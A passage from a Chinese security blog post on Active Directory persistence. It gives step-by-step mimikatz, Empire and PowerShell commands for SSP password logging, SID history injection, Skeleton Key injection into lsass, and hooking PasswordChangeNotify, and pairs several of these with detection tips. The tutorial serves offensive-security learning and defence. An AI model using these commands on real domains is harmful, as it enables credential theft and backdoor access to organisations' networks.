+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210224194133.png"></p>
+<p><strong>方法二：可以重启</strong></p>
+<p>将mimilib.dll放在系统system32目录下，注意位数，并添加到注册表中，这样即使重启也不会影响效果。实测使用64位mimilib.dll。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hklm/system/currentcontrolset/control/lsa/security packages</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210224194219.png"></p>
+<p>重启后登录的输入账号和密码明文会被记录在system32目录下kiwissp.log中。</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210224194233.png"></p>
+<p><strong>防御</strong></p>
+<ol>
+<li>检查hklm&#x2F;system&#x2F;currentcontrolset&#x2F;control&#x2F;lsa&#x2F;security packages中是否有可疑DLL文件。</li>
+<li>检查system32目录下是否有可疑DLL文件。</li>
+<li>检查LSA中是否有可疑DLL文件。</li>
+</ol>
+<h2 id="SID-history"><a href="#SID-history" class="headerlink" title="SID history"></a><strong>SID history</strong></h2><p>每个用户都有自己的SID，作用是控制访问资源权限。</p>
+<p>SID history，即在迁移后用户SID发生变化，但系统会将原来的SID添加到迁移后用户的SID history中，使其保持原有权限。</p>
+<p>SID获取：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic useraccount get name,sid    域普通用户权限即可</span><br></pre></td></tr></table></figure>
+
+<p><strong>mimikatz</strong></p>
+<p>将administrator的SID添加到指定用户的SID history中。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import-module activedirectory </span><br><span class="line">get-aduser testuser2 -properties sidhistory </span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug </span><br><span class="line">sid::patch </span><br><span class="line">sid::add /sam:testuser2 /new:adminisrtrator </span><br><span class="line">sid::clear /sam:testuser2    清除属性</span><br></pre></td></tr></table></figure>
+
+<p>可以看到低权限用户testuser2的SID history被添加。</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210224194820.png"></p>
+<p>低权限账号成功访问域控C盘。</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210224194824.png"></p>
+<p><strong>防御</strong></p>
+<ol>
+<li>查看域用户中SID为500的用户。</li>
+<li>迁移用户后对相同SID history属性的用户检查。</li>
+<li>定期检查ID为4765和4766的日志。4765为添加成功的日志，4766为添加失败的日志。</li>
+</ol>
+<h2 id="Golden-Ticket"><a href="#Golden-Ticket" class="headerlink" title="Golden Ticket"></a><strong>Golden Ticket</strong></h2><p>请参考：<a target="_blank" rel="noopener" href="http://blog.v3teran.xyz/2021/02/05/pass_the_ticket/">http://blog.v3teran.xyz/2021/02/05/pass_the_ticket/</a></p>
+<h2 id="Silver-Ticket"><a href="#Silver-Ticket" class="headerlink" title="Silver Ticket"></a><strong>Silver Ticket</strong></h2><p>请参考：<a target="_blank" rel="noopener" href="http://blog.v3teran.xyz/2021/02/05/pass_the_ticket/">http://blog.v3teran.xyz/2021/02/05/pass_the_ticket/</a></p>
+<h2 id="Skeleton-Key"><a href="#Skeleton-Key" class="headerlink" title="Skeleton Key"></a><strong>Skeleton Key</strong></h2><p>万能密码，将key注入到lsass.exe中，重启后失效，只有在64位系统中有用。</p>
+<p><strong>mimikatz</strong></p>
+<p>在DC中注入key到lsass.exe中。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug </span><br><span class="line">misc::skeleton</span><br></pre></td></tr></table></figure>
+
+<p>此时会在域内所有账号中添加一个Skeleton key，默认密码为mimikatz，可以以域内任意用户身份进行域内身份授权验证。</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210224195238.png"></p>
+<p>在域普通用户权限下与DC建立IPC$，利用域管用户名。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net use \\dc\ipc$ &quot;mimikatz&quot; /user:holy\administrator</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210224195243.png"></p>
+<p><strong>Empire</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">usemodule persistence/misc/skeleton_key*</span><br></pre></td></tr></table></figure>
+
+<p>该模块原理是：通过powersploit的invoke-mimikatz.ps1脚本，将key注入到lsass.exe。</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210224195515.png"></p>
+<h2 id="Hook-PasswordChangeNotify"><a href="#Hook-PasswordChangeNotify" class="headerlink" title="Hook PasswordChangeNotify"></a><strong>Hook PasswordChangeNotify</strong></h2><p>用户在修改密码时，输入新密码后LSA会调用PasswordFilter来检查该密码复杂度要求，通过后会调用PasswordChangeNotify在系统中同步密码。可以hook该功能获取密码明文。只存在于server系统。</p>
+<p><strong>方法一</strong></p>
+<p>上传对应ps1和dll文件到DC中，执行命令。</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/kevien/PasswordchangeNotify">https://github.com/kevien/PasswordchangeNotify</a> </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PowerShell.exe -ExecutionPolicy Bypass -File HookPasswordChangeNotify.ps1</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210224195740.png"></p>
+<p>只要用户修改密码，就能在c:\windows\temp目录下passwords.txt文件中记录密码明文。</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210224195749.png"></p>
+<p>在C:\Windows\System32\新建配置文件system.ini，写入要连接的ip地址和端口。修改密码后远程服务器的web日志中会返回账号密码。<strong>实测失败</strong>。</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210224195756.png"></p>
+<p><strong>方法二</strong></p>
+<p>上传对应ps1和dll文件到DC中，执行命令。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Set-ExecutionPolicy Unrestricted </span><br><span class="line">import-module .\Invoke-ReflectivePEInjection.ps1 </span><br><span class="line">.\Invoke-ReflectivePEInjection -PEPath HookPasswordChange.dll -procname lsass</span><br></pre></td></tr></table></figure>
+
+<p>随后只要用户修改密码，就能在c:\windows\temp目录下passwords.txt文件中记录密码明文。<strong>实测失败</strong>。</p>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p>《内网安全攻防渗透测试实战指南》</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">V3teran</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://v3teran.github.io/2021/02/24/242bb859.html">https://v3teran.github.io/2021/02/24/242bb859.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://V3teran.github.io" target="_blank">V3teran's blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E5%9F%9F/">域</a><a class="post-meta__tags" href="/tags/%E7%A5%A8%E6%8D%AE/">票据</a><a class="post-meta__tags" href="/tags/Hash/">Hash</a><a class="post-meta__tags" href="/tags/%E5%90%8E%E9%97%A8/">后门</a><a class="post-meta__tags" href="/tags/%E4%BB%A4%E7%89%8C/">令牌</a></div><div class="post_share"><div class="social-share" data-image="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/post/20210224160908.jpeg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2021/02/24/bfad6846.html"><img class="prev-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/post/20210224104323.jpeg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">JWT漏洞</div></div></a></div><div class="next-post pull-right"><a href="/2021/02/25/a9dc5042.html"><img class="next-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/post/20210225133209.jpeg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">NTDS.dit及域Hash获取</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2021/02/04/ed458597.html" title="Pass The Hash"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/post/20210402195521.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-02-04</div><div class="title">Pass The Hash</div></div></a></div><div><a href="/2021/02/05/7493558d.html" title="Pass The Key"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/post/20210402195121.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-02-05</div><div class="title">Pass The Key</div></div></a></div><div><a href="/2021/02/05/bbd2dee8.html" title="Pass The Ticket"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/post/20210402195421.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-02-05</div><div class="title">Pass The Ticket</div></div></a></div><div><a href="/2021/04/23/2ffa9369.html" title="AS-REP Roasting攻击"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/post/20210423145745.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-04-23</div><div class="title">AS-REP Roasting攻击</div></div></a></div><div><a href="/2021/03/31/6aff18c2.html" title="域委派攻击"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/post/20210328210858.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-03-31</div><div class="title">域委派攻击</div></div></a></div><div><a href="/2021/04/02/58add7e9.html" title="跨域"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/post/20210402094517.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-04-02</div><div class="title">跨域</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#windows%E6%9C%AC%E5%9C%B0"><span class="toc-number">1.</span> <span class="toc-text">windows本地</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%B2%98%E6%BB%9E%E9%94%AE"><span class="toc-number">1.1.</span> <span class="toc-text">粘滞键</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%A8%E5%86%8C%E8%A1%A8"><span class="toc-number">1.2.</span> <span class="toc-text">注册表</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1"><span class="toc-number">1.3.</span> <span class="toc-text">计划任务</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#meterpreter%E5%90%8E%E9%97%A8"><span class="toc-number">1.4.</span> <span class="toc-text">meterpreter后门</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Cymothoa"><span class="toc-number">1.5.</span> <span class="toc-text">Cymothoa</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WMI"><span class="toc-number">1.6.</span> <span class="toc-text">WMI</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Nishang"><span class="toc-number">1.7.</span> <span class="toc-text">Nishang</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BD%B1%E5%AD%90%E8%B4%A6%E6%88%B7"><span class="toc-number">1.8.</span> <span class="toc-text">影子账户</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8E%E5%9F%9F%E6%8E%A7"><span class="toc-number">2.</span> <span class="toc-text">基于域控</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#DSRM"><span class="toc-number">2.1.</span> <span class="toc-text">DSRM</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SSP"><span class="toc-number">2.2.</span> <span class="toc-text">SSP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SID-history"><span class="toc-number">2.3.</span> <span class="toc-text">SID history</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Golden-Ticket"><span class="toc-number">2.4.</span> <span class="toc-text">Golden Ticket</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Silver-Ticket"><span class="toc-number">2.5.</span> <span class="toc-text">Silver Ticket</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Skeleton-Key"><span class="toc-number">2.6.</span> <span class="toc-text">Skeleton Key</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Hook-PasswordChangeNotify"><span class="toc-number">2.7.</span> <span class="toc-text">Hook PasswordChangeNotify</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">3.</span> <span class="toc-text">参考</span></a></li></ol></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2021 - 2022 <i style="color:#FF6A6A;animation: announ_animation 0.8s linear infinite;" class="fa fa-heartbeat"></i> V3teran</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">本地搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js" type="module"></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload/dist/lazyload.iife.min.js"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><script>function panguFn () {
+  if (typeof pangu === 'object') pangu.autoSpacingPage()
+  else {
+    getScript('https://cdn.jsdelivr.net/npm/pangu/dist/browser/pangu.min.js')
+      .then(() => {
+        pangu.autoSpacingPage()
+      })
+  }
+}
+
+function panguInit () {
+  if (false){
+    GLOBAL_CONFIG_SITE.isPost && panguFn()
+  } else {
+    panguFn()
+  }
+}
+
+document.addEventListener('DOMContentLoaded', panguInit)</script><script src="/js/search/local-search.js"></script><script>var preloader = {
+  endLoading: () => {
+    document.body.style.overflow = 'auto';
+    document.getElementById('loading-box').classList.add("loaded")
+  },
+  initLoading: () => {
+    document.body.style.overflow = '';
+    document.getElementById('loading-box').classList.remove("loaded")
+
+  }
+}
+window.addEventListener('load',preloader.endLoading())</script><div class="js-pjax"></div><script data-pjax src="/js/lalala.js"></script><script src="/live2d-widget/autoload.js"></script><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/click-show-text.min.js" data-mobile="true" data-text="爱国,和谐,友善,富强,敬业,自由,平等,民主" data-fontsize="16px" data-random="true" async="async"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><!-- hexo injector body_end start --><script data-pjax>function history_calendar_injector_config(){
+                var parent_div_git = document.getElementsByClassName('sticky_layout')[0];
+                var item_html = '<div class="card-widget card-history"><div class="card-content"><div class="item-headline"><i class="fas fa-clock fa-spin"></i><span>那年今日</span></div><div id="history-baidu" style="height: 100px;overflow: hidden"><div class="history_swiper-container" id="history-container" style="width: 100%;height: 100%"><div class="swiper-wrapper" id="history_container_wrapper" style="height:20px"></div></div></div></div>';
+                console.log('已挂载history_calendar')
+                // parent_div_git.innerHTML=item_html+parent_div_git.innerHTML // 无报错，但不影响使用(支持pjax跳转)
+                parent_div_git.insertAdjacentHTML("afterbegin",item_html) // 有报错，但不影响使用(支持pjax跳转)
+            }if( document.getElementsByClassName('sticky_layout')[0] && (location.pathname ==='/'|| '/' ==='all')){
+
+            history_calendar_injector_config()
+        } </script><script data-pjax  src="https://cdn.jsdelivr.net/npm/swiper/swiper-bundle.min.js"></script><script data-pjax src="https://cdn.jsdelivr.net/gh/Zfour/Butterfly-card-history/baiduhistory/js/main.js"></script><!-- hexo injector body_end end --></body></html>
